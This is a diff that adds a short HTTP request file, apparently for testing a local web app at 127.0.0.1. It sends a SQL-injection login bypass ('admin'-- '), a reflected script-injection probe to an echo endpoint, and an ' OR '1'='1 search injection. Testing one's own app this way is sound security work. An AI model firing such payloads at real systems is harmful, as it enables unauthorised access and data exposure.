@@ -1,0 +1,19 @@
+@BASE_URL = http://127.0.0.1:8000
+
+###
+
+POST {{BASE_URL}}/login
+Content-Type: application/json
+
+{
+    "username": "admin'-- ",
+    "password": "x"
+}
+
+###
+
+GET {{BASE_URL}}/echo?msg=<script>alert(1)</script>
+
+###
+
+GET {{BASE_URL}}/search?q=' OR '1'='1
